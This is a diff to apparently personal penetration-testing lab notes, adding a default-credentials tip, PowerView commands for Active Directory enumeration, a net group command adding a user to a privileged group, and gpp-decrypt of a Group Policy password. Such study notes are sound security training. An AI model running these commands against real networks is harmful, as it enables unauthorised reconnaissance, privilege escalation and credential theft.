@@ -1,6 +1,7 @@
 # Default Credentials
 ```bash
 test every username with password 'password'
+linux can be case sensitive so make suer to try out Capitalized name
 
 admin:admin
 admin:password
@@ -121,6 +122,47 @@ crackmapexec smb 192.168.x.x -u 'random' -p '' --shares
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig -File -Recurse -ErrorAction SilentlyContinue
 > Check every user's directory && desktop && documents && downloads
+```
+
+## PowerView.ps1
+```bash
+Import-Module .\PowerView.ps1
+Get-NetDomain
+Get-NetUser
+Get-NetUser | select cn
+
+Get-NetGroup | select cn
+Get-NetGroup "Sales Department" | select member
+
+# Enumerate the computer objets in the domain
+Get-NetComputer
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+
+# Enumerate Logged on Users
+Find-LocalAdminAccess
+Get-NetSession -ComputerName files04 -Verbose
+Get-NetSession -ComputerName web04 -Verbose
+
+.\PsLoggedon.exe \\files04
+.\PsLoggedon.exe \\web04
+.\PsLoggedon.exe \\client74
+
+# Enumerate Service Principal Names
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+nslookup.exe web04.corp.com
+
+# Enumerate Object Permissions
+Get-ObjectAcl -Identity stephanie
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
+
+net group "Management Department" stephanie /add /domain
+Get-NetGroup "Management Department" | select member
+
+# Enumerate Domain shares
+Find-DomainShare
+ls \\dc1.corp.com\sysvol\corp.com\
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
 
 ## Add user
@@ -601,4 +643,10 @@ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+## File transfer
+```bash
+
+
 ```
